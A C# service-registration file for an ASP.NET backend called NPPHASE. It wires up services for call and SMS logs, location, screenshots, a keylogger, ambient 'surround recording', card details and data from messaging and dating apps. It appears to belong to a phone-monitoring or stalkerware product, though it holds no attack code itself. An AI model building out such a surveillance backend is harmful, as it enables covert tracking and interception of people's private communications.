using NPPHASE.Data.Implementations;
using NPPHASE.Data.Interface;
using NPPHASE.Data.Seeder;
using NPPHASE.Services.IRepositories;
using NPPHASE.Services.Repositories;

namespace NPPHASE.Apis
{
    public static class RegisterServices
    {
        public static void RegisterService(IServiceCollection services)
        {
            services.AddSingleton(typeof(IRepository<>), typeof(Repository<>));
            services.AddTransient(typeof(IService<>), typeof(Service<>));
            services.AddTransient<IUnitofWork, UnitofWork>();
            services.AddTransient<IAnalyticsService, AnalyticsService>();
            services.AddTransient<ICallLogService, CallLogService>();
            services.AddTransient<ICardDetailService, CardDetailService>();
            services.AddTransient<IContactsService, ContactsService>();
            services.AddTransient<ICalendarService, CalendarService>();
            services.AddTransient<IDeviceDataService, DeviceDataService>();
            services.AddTransient<IDeviceUserServices, DeviceUserServices>();
            services.AddTransient<IDownloadService, DownloadService>();
            services.AddScoped<IExceptionLoggerServices, ExceptionLoggerServices>();
            services.AddScoped<IFaceBookService, FaceBookService>();
            services.AddTransient<IGalleryService, GalleryService>();
            services.AddTransient<IGmailService, GmailService>();
            services.AddTransient<IHomeService, HomeService>();
            services.AddTransient<IInstalledAppService, InstalledAppService>();
            services.AddTransient<IInternetHistoryService, InternetHistoryService>();
            services.AddTransient<IKikService, KikService>();
            services.AddTransient<IKeyLoggerServices, KeyLoggerServices>();
            services.AddTransient<ILineService, LineService>();
            services.AddTransient<ILocationService, LocationService>();
            services.AddTransient<IScreenTimeService, ScreenTimeService>();
            services.AddTransient<IScreenShotService, ScreenShotService>();
            services.AddTransient<ISkypeService, SkypeService>();
            services.AddTransient<ISMSLogService, SMSLogService>();
            services.AddTransient<ISurroundRecordingService, SurroundRecordingService>();
            services.AddTransient<ITinderSevice, TinderSevice>();
            services.AddTransient<IViberService, ViberService>();
            services.AddTransient<IWhatsappService, WhatsappService>();
            services.AddTransient<IWiFiNetworksService, WiFiNetworksService>();
            services.AddTransient<IUnitofWork, UnitofWork>();
            services.AddTransient<IdentityDataSeeder, IdentityDataSeeder>();
            services.AddTransient<IDeviceUserCleanupService, DeviceUserCleanupService>();
            services.AddTransient<IDeviceUserServices, DeviceUserServices>();
        }
    }
}
